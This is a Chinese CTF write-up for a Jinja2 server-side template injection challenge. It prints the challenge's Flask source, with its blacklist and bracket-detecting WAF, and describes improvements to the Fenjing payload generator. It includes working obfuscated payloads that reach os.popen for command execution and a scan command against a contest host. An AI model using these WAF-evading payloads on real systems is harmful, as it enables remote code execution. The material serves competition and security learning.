# 源码
collapsed:: true
	- 稍微修改了一点
	- ```python
	  @app.route('/secr3ttt', methods=['GET', 'POST'])
	  def secr3t():
	  
	      name = request.args.get('klf', '')
	      template = f'''
	         <html>
	             <body>
	                 <h1>找到secr3t了，但是找不到flag你还是个klf</h1>
	                 <h1>%s</h1>         
	             </body>
	         </html>
	         <img src=\"https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\" alt="g">
	         <!--klf?-->
	         <!-- klf还想要flag？没那么容易 -->
	  
	         '''
	      bl = ['_', '\\', '\'', '"', 'request', "+", 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr',
	            'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/',
	            'flashed', 'os', 'open', 'read', 'count', '*', '43', '45', '38', '124', '47', '59', '99', '100', 'cat', '~',
	            ':', 'not', '0', 'length', 'index', '-', 'ord', '37', '94', '96', '48', '49', '50', '51', '52', '53', '54',
	            '55', '56', '57',
	            '58', '59', '[', ']', '@', '^', '#']
	      for i in bl:
	          if i in name:
	              return str('klf.html')
	              #return "真是klf！！！回去多学学啦"
	  
	      two_bracket_pattern = r"\s*\)\s*\)"
	      two_bracket_match = re.search(two_bracket_pattern, name)
	      bracket_comma_bracket_pattern = r"\s*\)\s*(,)?\s*\)"
	      bracket_comma_bracket_match = re.search(bracket_comma_bracket_pattern, name)
	      bracket_bracket_line_pattern = r"\s*\)\s*\)\s*\|"
	      bracket_bracket_line_match = re.search(bracket_bracket_line_pattern, name)
	      comma_bracket_bracket_line_pattern = r"\s*,\s*\)\s*\)\s*\|"
	      comma_bracket_bracket_line_match = re.search(comma_bracket_bracket_line_pattern, name)
	  
	      pattern_mo = r"\d+\s*%\s*\d+|[a-zA-Z]+\s*%\s*[a-zA-Z]+"
	      matche_mo = re.search(pattern_mo, name)
	  
	      if two_bracket_match:
	          if bracket_comma_bracket_match.group(1):
	              print("bracket_comma_bracket_match: " + name)
	              return str('klf.html')
	          elif comma_bracket_bracket_line_match:
	              print("comma_bracket_bracket_line_match: " + name)
	              return str('klf.html')
	          elif bracket_bracket_line_match:
	              print("bracket_bracket_line_match: " + name)
	              return render_template_string(template % name)
	          else:
	              print("two_bracket_match: " + name)
	              return str('klf.html')
	  
	      # 输出匹配的结果
	      if matche_mo :
	          print("match_mo: " + name)
	          return str('klf.html')
	  
	  
	      a=render_template_string(template % name)
	      print("passed: " + name)
	      if "{" in a:
	          return a + str('win.html')
	      return  a
	  ```
- # 分析
	- WAF可以分成三部分：keyword检测WAF、针对`))`的规则WAF、针对`%`的特殊waf
		- `))`特殊waf：在匹配到`))`之后做检测：
			- 匹配到`),)`：ban
			- 匹配到`,))|`：ban
			- 匹配到`))|`：通过
				- 总感觉这是给新版焚靖开的绿灯。。。
			- 否则ban
		- `%`的特殊waf
			- ban了`数字%数字`和`关键字%关键字`两种payload
	- 焚靖会在生成一列数字后通过filter求和，也会在生成一系列字符后通过filter拼接，此时旧版焚靖会在生成时加上多余的逗号，被上方的waf检测。
	- 焚靖生成payload时需要使用大量的嵌套递归生成payload, 这不可避免地会生成很多括号，此时旧版会被上方的waf检测到
- # 绕过
	- 和[[CTFWEB/WP/klf_2的SSTI自动化绕过]]重复的就不介绍了，主要就是多了双层括号的检测
	- 实际上旧版焚靖对waf有以下假设：
		- waf是幂等的，所以我们可以自动化waf检测
		- waf是简单的关键字检测，没有对长度等其他特征进行检测，所以我们可以通过不断嵌套表达式构造payload
		- waf没有对括号进行判断，所以我们可以在表达式中随意加括号，不需要处理运算优先级
		- 将可以通过waf的表达式A拼接到可以通过waf的字符串B中，形成的表达式C也可以通过WAF，所以我们可以在生成一个子表达式后随意使用
	- 但是在焚靖推出后，上述假设逐渐消解：
		- 有题目使用了随机化的waf，随机选取黑名单关键字
		- 有题目检测payload长度，禁止使用过长的payload
		- 有题目（比如这题）过滤了括号
		- 有题目（就这题）开始检测特殊的嵌套表达式
	- 多层括号
		- 新版(~~大概会是`v0.5.10`~~`v0.6.0`)使用了`(1,2,3)|sum`的形式求任意整数，使用`))|join`拼接字符串，刚好可以绕过上方的waf，但还是需要避免出现多层括号。。。
		- 避免需要多层括号需要计算优先级，计算优先级需要重写几乎所有生成表达式的规则
		- 之前就想做这个功能了，如果不是这道题我可能永远都不会去写。。。
		- 计算完优先级就可以计算出哪里需要加上括号，哪里不需要，然后把多余的括号去除掉，效果如下：
			- 旧：
				- ```jinja2
				  {{(((((lipsum|attr((lipsum|escape|batch(22)|list|first|last)*2+'globals'+(lipsum|escape|batch(22)|list|first|last)*2))|attr((lipsum|escape|batch(22)|list|first|last)*2+'getitem'+(lipsum|escape|batch(22)|list|first|last)*2))((lipsum|escape|batch(22)|list|first|last)*2+'builtins'+(lipsum|escape|batch(22)|list|first|last)*2)|attr((lipsum|escape|batch(22)|list|first|last)*2+'getitem'+(lipsum|escape|batch(22)|list|first|last)*2))((lipsum|escape|batch(22)|list|first|last)*2+'import'+(lipsum|escape|batch(22)|list|first|last)*2)('os').popen('ls ')).read())}}
				  ```
			- 新：
				- ```jinja2
				  {{lipsum|attr(lipsum|escape|batch(22)|list|first|last*2+'globals'+lipsum|escape|batch(22)|list|first|last*2)|attr(lipsum|escape|batch(22)|list|first|last*2+'getitem'+lipsum|escape|batch(22)|list|first|last*2)(lipsum|escape|batch(22)|list|first|last*2+'builtins'+lipsum|escape|batch(22)|list|first|last*2)|attr(lipsum|escape|batch(22)|list|first|last*2+'getitem'+lipsum|escape|batch(22)|list|first|last*2)(lipsum|escape|batch(22)|list|first|last*2+'import'+lipsum|escape|batch(22)|list|first|last*2)('os').popen('ls ').read()}}
				  ```
		- 然后函数调用之类的地方也有可能因为内层表达式带有括号而导致双括号，在末尾加上逗号即可。最后即使强过滤`))`也可以自动解出：
			- ```jinja2
			  {%set prrc=((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join,(dict(c=x)|join),dict()|trim|last)|join).format(((9,9,9,1,9)|sum))%}
			  {{lipsum
			  |attr(x|center(11)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(95,95,(39,39,25)|sum,(35,35,35,3)|sum,111,98,97,(35,35,35,3)|sum,115,95,95),)
			  |attr(x|center(11)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(95,95,(39,39,25)|sum,(39,39,23)|sum,116,(39,39,27)|sum,116,(39,39,23)|sum,(39,39,31)|sum,95,95),)(x|center(12)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(95,95,98,117,(39,39,27)|sum,(35,35,35,3)|sum,116,(39,39,27)|sum,(39,39,32)|sum,115,95,95),)
			  |attr(x|center(11)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(95,95,(39,39,25)|sum,(39,39,23)|sum,116,(39,39,27)|sum,116,(39,39,23)|sum,(39,39,31)|sum,95,95),)(x|center((9,1)|sum)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(95,95,(39,39,27)|sum,(39,39,31)|sum,112,111,114,116,95,95),)(x|center(2)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(111,115),)
			  |attr(x|center(5)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(112,111,112,(39,39,23)|sum,(39,39,32)|sum),)(x|center(4)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%((35,35,35,3)|sum,115,32,(39,8)|sum),)
			  |attr(x|center(4)|replace(x|center|first,(prrc,joiner|string|batch(2)|first|last)|join)%(114,(39,39,23)|sum,97,(39,39,22)|sum),)()}}
			  ```
	- 改进完直接梭就是了：`python -m fenjing scan --url 'https://jmbk4t72kryptmvbndz5vdoxc.node.game.sycsec.com/secr3ttt' --detect-mode fast`
	- 目前对比旧版，新版焚靖主要改进了几点：
		- 增加了基础的优先级检测
		- 增加了一系列生成数字的规则
		- 针对双括号进行了规避，增加相关规则
		- 改进scan功能、检测长payload是否被waf之类一系列的常规优化
- # 一点碎碎念
	- 焚靖的出现就是为了自动化解决常规Jinja SSTI题目，从而倒逼（如果可能的话..）各大比赛推出更加复杂且有趣的赛题。如果说长度检测和随机化waf还算有趣的话，那这题就是无聊到顶点的常规SSTI
	- 而且作为开源工具，焚靖本身必然会被出题人针对，也就是说焚靖不仅需要解决已经存在的赛题，还需要“解决”不存在的赛题。所以要尽量隐藏焚靖的特征，让焚靖的payload更像手工书写的payload, 避免其特征被出题人利用，写出针对性waf。